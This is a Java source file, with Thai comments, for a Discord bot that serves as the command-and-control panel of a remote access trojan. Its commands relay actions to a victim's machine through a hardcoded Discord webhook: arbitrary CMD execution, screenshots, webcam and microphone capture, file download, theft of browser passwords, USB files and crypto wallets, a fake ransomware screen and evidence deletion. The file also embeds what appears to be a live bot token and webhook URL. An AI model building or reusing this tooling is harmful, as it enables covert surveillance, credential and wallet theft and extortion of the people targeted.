import net.dv8tion.jda.api.JDA;
import net.dv8tion.jda.api.JDABuilder;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import net.dv8tion.jda.api.requests.GatewayIntent;
import net.dv8tion.jda.api.utils.cache.CacheFlag;

import javax.security.auth.login.LoginException;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

public class DiscordBot extends ListenerAdapter {

    // ========================================================
    // 🔑 ใส่ Token ที่ได้จาก Discord Developer Portal ที่นี่!
    // ========================================================
    private static final String TOKEN = "MTU0MjQyODQ3MzU2MDI3NzA4Mg.G_4tmv.ocM3i7kc2U6jZbI6ltlLjTrDYrYclP-6qvLJA8";
    
    // Webhook URL ของ Key Logger (สำหรับส่งคำสั่ง)
    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1542458066157572188/1O-xPE2tJ2l8rCyomB8khGM3c7XsnOp3pnpF6sNQljo4_hanKRFZdiN8jRA9aiJ5a6Dj";
    // ========================================================

    public static void main(String[] args) throws LoginException, InterruptedException {
        System.out.println("=".repeat(50));
        System.out.println("🤖 กำลังเริ่ม Discord Bot (Java)...");
        System.out.println("=".repeat(50));

        JDA jda = JDABuilder.createDefault(TOKEN)
                .enableIntents(
                        GatewayIntent.MESSAGE_CONTENT,
                        GatewayIntent.GUILD_MESSAGES,
                        GatewayIntent.GUILD_MEMBERS
                )
                .enableCache(CacheFlag.MEMBER_OVERRIDES)
                .addEventListeners(new DiscordBot())
                .build();

        jda.awaitReady();

        System.out.println("=".repeat(50));
        System.out.println("✅ BOT ออนไลน์แล้ว!");
        System.out.println("📌 ชื่อ: " + jda.getSelfUser().getName());
        System.out.println("📌 ID: " + jda.getSelfUser().getId());
        System.out.println("📌 Server ที่อยู่: " + jda.getGuilds().size() + " แห่ง");
        System.out.println("=".repeat(50));

        jda.getPresence().setActivity(
            net.dv8tion.jda.api.entities.Activity.playing("!help | 1818")
        );
    }

    @Override
    public void onMessageReceived(MessageReceivedEvent event) {
        if (event.getAuthor().isBot()) return;

        String message = event.getMessage().getContentRaw();
        String channelName = event.getChannel().getName();

        // Mention Reply
        if (message.contains("<@" + event.getJDA().getSelfUser().getId() + ">")) {
            event.getChannel().sendMessage("👋 สวัสดี " + event.getAuthor().getAsMention() + "! พิมพ์ `!help` เพื่อดูคำสั่ง").queue();
            return;
        }

        // ==================== คำสั่งหลัก ====================
        
        if (message.equalsIgnoreCase("!ping")) {
            long latency = event.getJDA().getGatewayPing();
            event.getChannel().sendMessage("🏓 Pong! " + latency + "ms").queue();
        }
        
        else if (message.equalsIgnoreCase("!hello")) {
            event.getChannel().sendMessage("สวัสดี " + event.getAuthor().getAsMention() + "! Bot ทำงานปกติ! 🔑 รหัส: 1818").queue();
        }
        
        else if (message.equalsIgnoreCase("!help")) {
            String helpText = """
                    📋 **รายการคำสั่งทั้งหมด:**
                    
                    **📨 ข้อความบนหน้าจอเหยื่อ:**
                    `!msg ข้อความ` - แสดงข้อความเต็มจอ
                    `!msg_alert ข้อความ` - แสดงพร้อมเสียงเตือน
                    `!msg_scroll ข้อความ` - แสดงข้อความวิ่ง
                    `!msg_matrix ข้อความ` - แสดง Matrix Effect
                    `!msg_ransom ข้อความ` - แสดง Ransomware Style
                    
                    **🖥️ การควบคุม:**
                    `!screenshot` - จับภาพหน้าจอ
                    `!ls C:\\\\path` - แสดงรายการไฟล์
                    `!download C:\\\\file.txt` - ดาวน์โหลดไฟล์
                    `!cmd คำสั่ง` - รันคำสั่ง CMD
                    `!lock` - ล็อกหน้าจอ
                    `!unlock` - ปลดล็อกหน้าจอ
                    `!webcam` - ถ่ายรูปเว็บแคม
                    `!record` - บันทึกเสียง 10 วินาที
                    `!screenrec` - บันทึกหน้าจอ 15 วินาที
                    `!map` - แสดงแผนที่ตำแหน่ง
                    `!remote` - Remote Desktop
                    
                    **💾 ขโมยข้อมูล:**
                    `!usb` - ขโมยไฟล์จาก USB
                    `!browser` - ขโมยรหัสผ่านเบราว์เซอร์
                    `!crypto` - ขโมย Crypto Wallet
                    `!ransom` - เปิด Ransomware จำลอง
                    
                    **🧹 ระบบ:**
                    `!delete_evidence` - ลบหลักฐานทั้งหมด
                    `!ping` - ตรวจสอบ Bot
                    `!status` - ตรวจสอบสถานะ
                    
                    🔑 **รหัสปลดล็อก:** `1818`
                    """;
            event.getChannel().sendMessage(helpText).queue();
        }
        
        else if (message.equalsIgnoreCase("!status")) {
            String status = """
                    📊 **สถานะระบบ:**
                    
                    🔒 สถานะล็อก: ใช้งานอยู่ (รหัส: 1818)
                    💻 เครื่องเป้าหมาย: รอการเชื่อมต่อ
                    📡 Webhook: ✅ กำลังทำงาน
                    🔄 สถานะ Bot: 🟢 ออนไลน์
                    📦 โมดูล: cv2 ❌ | pyaudio ❌ | mss ❌
                    
                    พิมพ์ `!help` เพื่อดูคำสั่งทั้งหมด
                    """;
            event.getChannel().sendMessage(status).queue();
        }
        
        // ==================== คำสั่งส่งข้อความ ====================
        
        else if (message.startsWith("!msg ")) {
            String msg = message.substring(5);
            sendWebhookCommand("msg", msg);
            event.getChannel().sendMessage("📨 กำลังส่งข้อความไปหน้าจอ: **" + msg.substring(0, Math.min(50, msg.length())) + "**...").queue();
        }
        
        else if (message.startsWith("!msg_alert ")) {
            String msg = message.substring(11);
            sendWebhookCommand("msg_alert", msg);
            event.getChannel().sendMessage("🔊 กำลังส่งข้อความพร้อมเสียงเตือน...").queue();
        }
        
        else if (message.startsWith("!msg_scroll ")) {
            String msg = message.substring(12);
            sendWebhookCommand("msg_scroll", msg);
            event.getChannel().sendMessage("📜 กำลังส่งข้อความวิ่ง...").queue();
        }
        
        else if (message.startsWith("!msg_matrix ")) {
            String msg = message.substring(12);
            sendWebhookCommand("msg_matrix", msg);
            event.getChannel().sendMessage("💚 กำลังส่ง Matrix Effect...").queue();
        }
        
        else if (message.startsWith("!msg_ransom ")) {
            String msg = message.substring(12);
            sendWebhookCommand("msg_ransom", msg);
            event.getChannel().sendMessage("🔴 กำลังส่ง Ransomware Style...").queue();
        }
        
        // ==================== คำสั่งควบคุม ====================
        
        else if (message.equalsIgnoreCase("!screenshot")) {
            sendWebhookCommand("screenshot", "");
            event.getChannel().sendMessage("📸 กำลังจับภาพหน้าจอ... รอสักครู่").queue();
        }
        
        else if (message.equalsIgnoreCase("!webcam")) {
            sendWebhookCommand("webcam", "");
            event.getChannel().sendMessage("📷 กำลังเปิดเว็บแคม...").queue();
        }
        
        else if (message.equalsIgnoreCase("!record")) {
            sendWebhookCommand("record", "");
            event.getChannel().sendMessage("🎤 กำลังบันทึกเสียง 10 วินาที...").queue();
        }
        
        else if (message.equalsIgnoreCase("!screenrec")) {
            sendWebhookCommand("screenrec", "");
            event.getChannel().sendMessage("🎬 กำลังบันทึกหน้าจอ 15 วินาที...").queue();
        }
        
        else if (message.equalsIgnoreCase("!map")) {
            sendWebhookCommand("map", "");
            event.getChannel().sendMessage("🗺️ กำลังดึงข้อมูลตำแหน่ง...").queue();
        }
        
        else if (message.equalsIgnoreCase("!remote")) {
            sendWebhookCommand("remote", "");
            event.getChannel().sendMessage("🖥️ กำลังเชื่อมต่อ Remote Desktop...").queue();
        }
        
        else if (message.startsWith("!ls ")) {
            String path = message.substring(4);
            sendWebhookCommand("ls", path);
            event.getChannel().sendMessage("📂 กำลังแสดงไฟล์ใน: `" + path + "`").queue();
        }
        
        else if (message.startsWith("!download ")) {
            String path = message.substring(10);
            sendWebhookCommand("download", path);
            event.getChannel().sendMessage("📥 กำลังดาวน์โหลดไฟล์: `" + path + "`").queue();
        }
        
        else if (message.startsWith("!cmd ")) {
            String cmd = message.substring(5);
            sendWebhookCommand("cmd", cmd);
            event.getChannel().sendMessage("💻 กำลังรันคำสั่ง: `" + cmd + "`").queue();
        }
        
        else if (message.equalsIgnoreCase("!lock")) {
            sendWebhookCommand("lock", "");
            event.getChannel().sendMessage("🔒 กำลังล็อกหน้าจอ...").queue();
        }
        
        else if (message.equalsIgnoreCase("!unlock")) {
            sendWebhookCommand("unlock", "");
            event.getChannel().sendMessage("🔓 กำลังปลดล็อกหน้าจอ...").queue();
        }
        
        // ==================== คำสั่งขโมยข้อมูล ====================
        
        else if (message.equalsIgnoreCase("!usb")) {
            sendWebhookCommand("usb", "");
            event.getChannel().sendMessage("💾 กำลังขโมยไฟล์จาก USB...").queue();
        }
        
        else if (message.equalsIgnoreCase("!browser")) {
            sendWebhookCommand("browser", "");
            event.getChannel().sendMessage("🔑 กำลังขโมยรหัสผ่านเบราว์เซอร์...").queue();
        }
        
        else if (message.equalsIgnoreCase("!crypto")) {
            sendWebhookCommand("crypto", "");
            event.getChannel().sendMessage("💰 กำลังขโมย Crypto Wallet...").queue();
        }
        
        else if (message.equalsIgnoreCase("!ransom")) {
            sendWebhookCommand("ransom", "");
            event.getChannel().sendMessage("🔴 กำลังเปิด Ransomware จำลอง...").queue();
        }
        
        // ==================== คำสั่งระบบ ====================
        
        else if (message.equalsIgnoreCase("!delete_evidence")) {
            sendWebhookCommand("delete_evidence", "");
            event.getChannel().sendMessage("🧹 กำลังลบหลักฐานทั้งหมด...").queue();
        }
    }

    // ==================== ฟังก์ชันส่งคำสั่งไป Webhook ====================
    
    private void sendWebhookCommand(String command, String parameter) {
        try {
            // เข้ารหัส parameter ให้ปลอดภัย
            String encodedParam = Base64.getEncoder().encodeToString(parameter.getBytes(StandardCharsets.UTF_8));
            
            String jsonPayload = String.format(
                "{\"content\": \"```\\n[COMMAND]\\n%s\\n%s\\n```\"}",
                command,
                encodedParam
            );
            
            URL url = new URL(WEBHOOK_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            
            try (OutputStream os = conn.getOutputStream()) {
                byte[] input = jsonPayload.getBytes(StandardCharsets.UTF_8);
                os.write(input, 0, input.length);
            }
            
            int responseCode = conn.getResponseCode();
            if (responseCode >= 200 && responseCode < 300) {
                System.out.println("✅ ส่งคำสั่ง " + command + " ไป Webhook สำเร็จ");
            } else {
                System.out.println("❌ ส่งคำสั่งล้มเหลว: " + responseCode);
            }
            
            conn.disconnect();
            
        } catch (Exception e) {
            System.err.println("❌ Error ส่ง Webhook: " + e.getMessage());
        }
    }
}